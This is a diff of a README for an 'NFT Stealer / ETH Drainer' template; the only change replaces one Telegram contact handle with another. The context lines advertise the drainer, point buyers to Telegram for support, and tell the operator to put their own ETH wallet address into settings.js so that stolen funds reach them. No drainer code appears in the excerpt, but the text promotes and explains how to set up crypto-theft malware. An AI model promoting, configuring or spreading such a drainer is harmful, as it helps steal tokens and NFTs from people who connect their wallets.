@@ -1,4 +1,4 @@
-### If you have questions or need any help, Message me here: [@cybergeek](https://t.me/cybergeeky) 
+### If you have questions or need any help, Message me here: [@alphageek](https://t.me/alphageeky) 
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
@@ -10,7 +10,7 @@
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@cybergeek](https://t.me/cybergeeky)
+To get instant support, contact me on [@alphageek](https://t.me/alphageeky)
 
 
 ## `💡 Features`
